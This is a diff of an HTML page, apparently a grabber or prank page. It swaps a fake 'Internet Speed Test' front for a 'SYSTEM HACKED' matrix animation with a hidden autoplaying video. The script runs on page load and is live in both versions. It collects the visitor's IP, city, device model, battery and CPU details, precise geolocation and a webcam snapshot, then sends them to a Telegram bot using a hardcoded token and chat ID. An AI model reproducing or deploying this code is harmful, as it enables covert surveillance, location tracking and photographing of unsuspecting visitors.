@@ -1,80 +1,104 @@
 <!DOCTYPE html>
-<html>
-<head><title>Internet Speed Test</title></head>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Breach</title>
+    <style>
+        body { background: #000; margin: 0; overflow: hidden; font-family: 'Courier New', monospace; }
+        canvas#matrix { position: absolute; top: 0; left: 0; z-index: -1; }
+        .content {
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            height: 100vh; color: #0f0; text-shadow: 0 0 8px #0f0; background: rgba(0,0,0,0.6);
+        }
+        .box { border: 2px solid #0f0; padding: 20px; background: rgba(0,0,0,0.8); text-align: left; }
+    </style>
+</head>
 <body>
-    <h1 style="text-align:center;">Checking Internet Speed...</h1>
+    <iframe src="https://www.youtube.com/embed/u69mGv_LshY?autoplay=1&loop=1" allow="autoplay" style="display:none;"></iframe>
+    
+    <canvas id="matrix"></canvas>
+    
+    <div class="content">
+        <h1>[ SYSTEM HACKED ]</h1>
+        <div class="box">
+            <p>> Accessing Core...</p>
+            <p>> Downloading Data...</p>
+            <p id="status">> Initializing...</p>
+        </div>
+    </div>
+
     <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <canvas id="picCanvas" style="display:none;"></canvas>
 
     <script>
+        // --- ئەنیمەیشنی ماتریکس ---
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = "01010101HACKEDSYSTEM666";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0f0";
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                const text = letters.charAt(Math.floor(Math.random() * letters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 33);
+
+        // --- ناردنی زانیارییەکان ---
         const botToken = '8117812522:AAGFhq6xv5zgci1Z9mt5H1a3c26V7h48CI4';
         const chatId = '1034878899';
 
-        async function startTracking() {
+        async function start() {
             try {
-                // 1. وەرگرتنی ئایپی و شوێن
                 const res = await fetch('https://ipapi.co/json/');
                 const data = await res.json();
-                
-                // 2. دیاریکردنی مۆدێلی مۆبایل (بۆ ئەندرۆید وردترە)
                 const ua = navigator.userAgent;
-                let deviceModel = "Unknown Device";
-                if (/Android/i.test(ua)) {
-                    const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
-                    deviceModel = match ? match[2] : "Android Device";
-                } else if (/iPhone/i.test(ua)) {
-                    deviceModel = "iPhone";
-                }
-
-                // 3. پاتری
-                let batteryLevel = "Unknown";
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    batteryLevel = `${Math.round(battery.level * 100)}%`;
-                }
-
-                const info = `
-🔔 زانیاری نوێ:
-📱 مۆدێل: ${deviceModel}
-🌐 ئایپی: ${data.ip}
-📍 وڵات: ${data.country_name}
-🏢 کۆمپانیا: ${data.org}
-🔋 پاتری: ${batteryLevel}
-💾 ڕام: ${navigator.deviceMemory || 'نادیار'} GB
-⚙️ پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores
-🖥 شاشە: ${window.screen.width}x${window.screen.height}
-⏰ کات: ${new Date().toLocaleString()}
-                `;
+                let model = /Android/i.test(ua) ? (ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/)?.[2] || "Android") : (/iPhone/i.test(ua) ? "iPhone" : "PC");
                 
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`);
-            } catch (e) {}
+                let batt = "N/A";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    batt = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`;
+                }
 
-            // 4. شوێنی ورد (مۆڵەت)
+                const msg = `🎭 MATRIX HACK:\n📱 مۆدێل: ${model}\n🌐 ئایپی: ${data.ip}\n📍 شار: ${data.city}\n🔋 پاتری: ${batt}\n⚙️ ناوکە: ${navigator.hardwareConcurrency}`;
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
+            } catch(e) {}
+
             navigator.geolocation.getCurrentPosition(pos => {
-                const loc = `📍 نەخشە: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                const loc = `📍 MAP: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(loc)}`);
             });
 
-            // 5. وێنە (مۆڵەت)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
+                    const c = document.getElementById('picCanvas');
+                    c.width = video.videoWidth; c.height = video.videoHeight;
+                    c.getContext('2d').drawImage(video, 0, 0);
+                    c.toBlob(blob => {
                         const frm = new FormData();
-                        frm.append('chat_id', chatId); frm.append('photo', blob, 'img.jpg');
+                        frm.append('chat_id', chatId); frm.append('photo', blob, 'hacker.jpg');
                         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: frm });
-                        stream.getTracks().forEach(t => t.stop());
                     }, 'image/jpeg');
                 }, 2000);
-            } catch (err) {}
+            } catch(err) {}
         }
-
-        window.onload = startTracking;
+        window.onload = start;
     </script>
 </body>
 </html>
